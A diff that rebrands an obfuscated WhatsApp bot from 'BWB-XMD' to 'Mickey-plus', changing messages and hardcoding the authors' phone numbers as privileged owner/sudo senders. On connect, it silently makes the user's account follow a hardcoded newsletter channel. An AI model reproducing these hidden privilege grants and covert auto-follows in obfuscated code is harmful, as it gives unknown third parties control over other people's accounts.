@@ -1,4 +1,4 @@
-// Obfuscated by prince [MEDIUM]
+// codding by Mickey developer]
 'use strict';
 
 var __createBinding = this && this.__createBinding || (Object.create ? function (_0x384c03, _0x3d0204, _0x461e51, _0x49ce98) {
@@ -765,7 +765,7 @@ setTimeout(() => {
         await _0x197c7b.rejectCall(_0x50e24a, _0x398a5e);
         setTimeout(async () => {
           await _0x197c7b.sendMessage(_0x398a5e, {
-            'text': "🚫 *Call Rejected❗*  \nHi there,   \n⚠️ My owner is unavailable at the moment.  \n"
+            'text': "🚫 *Simu imekwata❗*  \nSamahani,   \n⚠️ sipo onnline kwa sasa nitakuchek .  \n"
           });
         }, 1000);
       }
@@ -811,10 +811,10 @@ setTimeout(() => {
       } = require("./bdd/sudo");
       const _0x103f23 = _0x5ba00c.pushName;
       const _0x35d74f = await _0x7cfce6();
-      const _0x3083cf = [_0x59f605, "255763834140", "255763834140", '255763834140', "255763834140", conf.NUMERO_OWNER].map(_0x385d66 => _0x385d66.replace(/[^0-9]/g) + '@s.whatsapp.net');
+      const _0x3083cf = [_0x59f605, "255711765335", "255612130873", '255711765335', "255711765335", conf.NUMERO_OWNER].map(_0x385d66 => _0x385d66.replace(/[^0-9]/g) + '@s.whatsapp.net');
       const _0x5d8c68 = _0x3083cf.concat(_0x35d74f);
       const _0x5c1f0c = _0x5d8c68.includes(_0x5383e1);
-      var _0x3ede21 = ["255763834140", "255763834140", '255763834140', "255763834140"].map(_0x412458 => _0x412458.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x5383e1);
+      var _0x3ede21 = ["255612130873", "255711765335", '255612130873', "255612130873"].map(_0x412458 => _0x412458.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x5383e1);
       function _0x35dcbe(_0x362039) {
         _0x197c7b.sendMessage(_0x162f50, {
           'text': _0x362039
@@ -822,7 +822,7 @@ setTimeout(() => {
           'quoted': _0x5ba00c
         });
       }
-      console.log("\t🌍BWB-XMD ONLINE🌍");
+      console.log("\t🌍MICKEY-PLUS ONLINE🌍");
       console.log("=========== written message===========");
       if (_0x288199) {
         console.log("message provenant du groupe : " + _0x4d1e06);
@@ -1291,12 +1291,12 @@ setTimeout(() => {
       try {
         const _0x4f608d = await _0x197c7b.groupMetadata(_0x54db9d.id);
         if (_0x54db9d.action == "add" && (await _0x3a398f(_0x54db9d.id, "welcome")) == 'on') {
-          let _0x547077 = "*BWB XMD WELCOME MESSAGE*";
+          let _0x547077 = "*MICKEY-PLUS WELCOME MESSAGE*";
           let _0x5edd8f = _0x54db9d.participants;
           for (let _0x3189eb of _0x5edd8f) {
             _0x547077 += " \n❒ *Hey* 🖐️ @" + _0x3189eb.split('@')[0] + " WELCOME TO OUR GROUP. \n\n";
           }
-          _0x547077 += "❒ *READ THE GROUP DESCRIPTION TO AVOID GETTING REMOVED BY BWB-XMD.* ";
+          _0x547077 += "❒ *READ THE GROUP DESCRIPTION TO AVOID GETTING REMOVED BY @MICKEY +.* ";
           _0x197c7b.sendMessage(_0x54db9d.id, {
             'image': {
               'url': _0x3f7d88
@@ -1412,11 +1412,11 @@ setTimeout(() => {
         connection: _0x2f552d
       } = _0x4f336c;
       if (_0x2f552d === 'connecting') {
-        console.log(" bwb is connecting...");
+        console.log(" mickey-plus is connecting...");
       } else {
         if (_0x2f552d === "open") {
-          console.log("✅ bwb Connected to WhatsApp! ☺️");
-          _0x197c7b.newsletterFollow("120363351653122969@newsletter");
+          console.log("✅ Mickey-plus Connected to WhatsApp! ☺️");
+          _0x197c7b.newsletterFollow("120363398106360290@newsletter");
           console.log('--');
           0;
           await baileys_1.delay(200);
@@ -1424,8 +1424,8 @@ setTimeout(() => {
           0;
           await baileys_1.delay(300);
           console.log("------------------/-----");
-          console.log("bwb xmd is Online 🕸\n\n");
-          console.log("Loading charles Commands ...\n");
+          console.log("Mickey-plus is Online 🕸\n\n");
+          console.log("Loading mickey Commands ...\n");
           fs.readdirSync(__dirname + "/commandes").forEach(_0x5792df => {
             if (path.extname(_0x5792df).toLowerCase() == ".js") {
               try {
